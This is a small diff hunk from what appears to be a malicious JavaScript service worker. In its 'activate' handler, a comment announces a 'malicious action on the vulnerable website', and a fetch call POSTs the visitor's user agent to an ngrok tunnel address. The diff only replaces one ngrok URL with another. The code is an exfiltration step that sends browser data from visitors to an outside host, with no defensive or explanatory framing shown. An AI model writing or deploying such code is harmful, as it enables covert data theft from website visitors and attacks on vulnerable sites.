@@ -21,7 +21,7 @@ self.addEventListener('activate', function(event) {
   });
 
   // Perform a malicious action on the vulnerable website or application
-  fetch('rapidly-vast-pipefish.ngrok-free.app/register.html', {
+  fetch('https://generally-delicate-camel.ngrok-free.app/', {
     method: 'POST',
     body: JSON.stringify({
       user: navigator.userAgent,
